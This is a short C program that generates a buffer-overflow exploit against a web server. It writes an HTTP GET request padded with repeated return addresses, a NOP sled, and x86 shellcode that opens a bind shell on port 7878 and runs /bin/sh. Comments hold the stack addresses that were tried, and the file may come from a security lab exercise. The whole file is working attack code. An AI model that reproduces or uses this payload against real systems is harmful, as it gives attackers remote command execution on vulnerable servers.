#include <stdlib.h>
#include <stdio.h>


char shellcode[] = "\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x1E\xC6\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80";
char NOP[] = "\x90";


//char addr[] = "\xbf\xff\xef\x88"; +340 bytes; 3221218536; 134515859;3221221228; bfffefd0;bffff034
char addr[] = "\xd3\xfe\xff\xbf" ; 

int main(int argc, char** argv) {
    //save everything to str.dat, run with cat str.dat in the folder that has it
    freopen ("str.dat","w",stdout);
    int ind;
    printf ("GET /");
    // fill with return addresses
    for(ind=0;ind<60;ind++) { 
        printf("%s", addr); 
    }

    //fill with NOP commands
    for(ind=0;ind<480;ind++) {
        printf("%s", NOP); 
    }

    //add in shellcode
    printf ("%s ", shellcode);
    printf ("HTTP");
    fclose (stdout);
    printf("add is %s",addr);
    return 0;
}
